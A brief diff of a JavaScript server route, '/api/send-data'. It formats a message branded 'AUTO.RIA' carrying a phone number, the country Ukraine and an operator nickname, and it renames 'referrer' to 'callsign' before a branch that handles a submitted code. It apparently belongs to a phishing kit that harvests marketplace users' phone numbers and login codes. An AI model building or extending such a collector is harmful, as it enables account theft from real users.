@@ -66,7 +66,7 @@ app.post('/api/send-data', async (req, res) => {
 *AUTO\\.RIA*  
 *Номер:* \`${escape(formatted)}\`  
 *Країна:* Україна  
-*Реферер:* @${escape(nick)}
+*Позывной:* @${escape(nick)}
         `.trim();
 
     } else if (step === 'code' && code) {
